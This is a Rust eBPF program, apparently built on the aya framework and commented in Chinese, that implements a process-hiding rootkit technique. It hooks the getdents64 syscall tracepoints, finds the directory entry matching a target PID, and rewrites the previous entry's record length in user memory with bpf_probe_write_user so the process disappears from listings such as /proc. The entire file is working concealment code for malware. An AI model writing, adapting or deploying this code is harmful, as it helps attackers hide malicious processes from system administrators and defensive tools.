#![no_std]
#![no_main]

use aya_ebpf::{
    helpers::{
        bpf_get_current_pid_tgid, bpf_probe_write_user,
        gen::{bpf_probe_read_user, bpf_probe_read_user_str},
    },
    macros::{map, tracepoint},
    maps::{HashMap, ProgramArray},
    programs::TracePointContext,
};
use aya_log_ebpf::info;
use core::mem::size_of_val;
use hide_me_common::*;
use vmlinux::vmlinux::linux_dirent64;

#[path = "./vmlinux/mod.rs"]
mod vmlinux;

// 表示 handle_getdents_enter 在 JUMP_TABLE 中的索引号
const ENTER: u32 = 0;

// 表示 handle_getdents_patch 在 JUMP_TABLE 中的索引号
const PARCHER: u32 = 1;

// 尾调用表，存储了一系列函数指针，类似于中断向量表
#[map]
static JUMP_TABLE: ProgramArray = ProgramArray::with_max_entries(2, 0);

// 存储 使用 sys_getdents64 的 pid_tgid 和 linux_dirent64 结构体首地址的映射
#[map]
static map_buffs: HashMap<usize, u64> = HashMap::<usize, u64>::with_max_entries(8192, 0);

#[map]
static map_bytes_read: HashMap<usize, usize> = HashMap::<usize, usize>::with_max_entries(8192, 0);

#[map]
static map_to_patch: HashMap<usize, usize> = HashMap::<usize, usize>::with_max_entries(8192, 0);

#[tracepoint]
pub fn hide_me(ctx: TracePointContext) -> u32 {
    // sys_enter_getdents64 入口点
    handle_getdents_enter(ctx).unwrap_or_else(|the_ret| the_ret)
}

// sys_getdents64 的入口实际处理函数
fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
    // 获得要隐藏的 pid
    let the_target_pid = unsafe { target_pid };

    // 如果 pid 为 0，表示不需要隐藏，直接返回
    if the_target_pid == 0 {
        return Ok(0);
    }

    // 获得调用 sys_enter_getdents64 的进程的 pid 与 tgid
    let pid_tgid = bpf_get_current_pid_tgid() as usize;

    // linux_dirent64 结构体在内存的排列是连续的，
    // 而且 sys_getdents64的第二个参数 dirent 正好指向第一个 linux_dirent64 结构体，
    // 所以根据上面的信息，我们只要知道 linux_dirent64 链表的大小，
    // 就能根据 linux_dirent64->d_reclen，
    // 就能准确从连续的内存中分割出每一块linux_dirent64。

    // 获取 linux_dirent64 结构体首地址
    let dirp: *const linux_dirent64 = unsafe { ctx.read_at(24).unwrap() };

    // 把 pid_tgid -> dirp 的映射存储到 map_buffs 中
    map_buffs.insert(&pid_tgid, &(dirp as u64), 0).unwrap();

    Ok(0)
}

// sys_enter_getdents64 的收尾处理函数
#[tracepoint]
fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {

    // 获得调用 sys_exit_getdents64 的进程的 pid 与 tgid
    // 用来判断是之前调用 sys_enter_getdents64 的进程
    let pid_tgid = bpf_get_current_pid_tgid() as usize;

    // 读取 sys_exit_getdents64 的 ret 参数字段，即 linux_dirent64 结构体数组的总长度
    let total_bytes_read: i64 = unsafe { ctx.read_at(16).unwrap() };

    // 要是总长度为零，那就直接退出。
    if total_bytes_read <= 0 {
        return Ok(0);
    }

    let pbuff_addr = unsafe { map_buffs.get(&pid_tgid) };

    if pbuff_addr.is_none() {
        return Ok(0);
    }

    let pbuff_addr = pbuff_addr.unwrap();

    let buff_addr = *pbuff_addr;

    // linux_dirent64 结构体 大小
    let mut d_reclen: u16 = 0;

    let mut dirp: *const linux_dirent64 = core::ptr::null();

    let mut filename: [u8; MAX_FILE_LEN] = [0; MAX_FILE_LEN];

    // 记录当前遍历的位置 bpos
    let mut bpos: usize = 0;

    let pBPOS = unsafe { map_bytes_read.get(&pid_tgid) };

    if let Some(pBPOS) = pBPOS {
        bpos = *pBPOS;
    } else {
        bpos = 0;
    }

    for _ in 0..128 {
        if bpos >= total_bytes_read as usize {
            break;
        }

        dirp = (buff_addr + bpos as u64) as *const linux_dirent64;

        unsafe {
            bpf_probe_read_user(
                &d_reclen as *const _ as *mut core::ffi::c_void,
                size_of_val(&d_reclen) as u32,
                &((*dirp).d_reclen) as *const _ as *const core::ffi::c_void,
            );

            if pid_to_hide_len >= 11 {
                return Ok(0);
            }

            bpf_probe_read_user_str(
                filename.as_mut_ptr() as *mut core::ffi::c_void,
                pid_to_hide_len,
                (*dirp).d_name.as_ptr() as *const core::ffi::c_void,
            );

            let mut j: usize = 0;
            while j < pid_to_hide_len as usize {
                if filename[j] != pid_to_hide[j] {
                    break;
                }
                j += 1;
            }

            if j == pid_to_hide_len as usize {
                map_bytes_read.remove(&pid_tgid).unwrap();
                map_buffs.remove(&pid_tgid).unwrap();

                if JUMP_TABLE.tail_call(&ctx, PARCHER).is_err() {
                    return Ok(0);
                }
            }
        }
        map_to_patch.insert(&pid_tgid, &(dirp as usize), 0).unwrap();
        bpos += d_reclen as usize;
    }

    if bpos < total_bytes_read as usize {
        map_bytes_read.insert(&pid_tgid, &bpos, 0).unwrap();

        unsafe {
            if JUMP_TABLE.tail_call(&ctx, ENTER).is_err() {
                return Ok(0);
            }
        }
    }
    map_bytes_read.remove(&pid_tgid).unwrap();
    map_buffs.remove(&pid_tgid).unwrap();

    return Ok(0);
}

#[tracepoint]
fn handle_getdents_patch(ctx: TracePointContext) -> Result<u32, u32> {
    info!(&ctx, "we have found it");
    let pid_tgid = bpf_get_current_pid_tgid() as usize;
    let pbuff_addr = unsafe { map_to_patch.get(&pid_tgid) };
    if pbuff_addr.is_none() {
        return Ok(0);
    }
    let pbuff_addr = pbuff_addr.unwrap();

    let buff_addr = *pbuff_addr;
    let dirp_previous = buff_addr as *mut linux_dirent64;
    let d_reclen_previous: u16 = 0;

    unsafe {
        bpf_probe_read_user(
            &d_reclen_previous as *const _ as *mut core::ffi::c_void,
            size_of_val(&d_reclen_previous) as u32,
            &((*dirp_previous).d_reclen) as *const _ as *const core::ffi::c_void,
        );
    }

    let dirp = (buff_addr as u64 + d_reclen_previous as u64) as *mut linux_dirent64;
    let d_reclen: u16 = 0;

    unsafe {
        bpf_probe_read_user(
            &d_reclen as *const _ as *mut core::ffi::c_void,
            size_of_val(&d_reclen) as u32,
            &((*dirp).d_reclen) as *const _ as *const core::ffi::c_void,
        );
    }

    let d_reclen_new = d_reclen_previous + d_reclen;
    let ret = unsafe {
        bpf_probe_write_user(
            &((*dirp_previous).d_reclen) as *const _ as *mut u16,
            &d_reclen_new,
        )
    };

    if ret.is_err() {
        info!(&ctx, "failed to correct");
        return Ok(0);
    } else {
        info!(&ctx, "succeed to correct");
    }

    map_to_patch.remove(&pid_tgid).unwrap();
    return Ok(0);
}

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    unsafe { core::hint::unreachable_unchecked() }
}
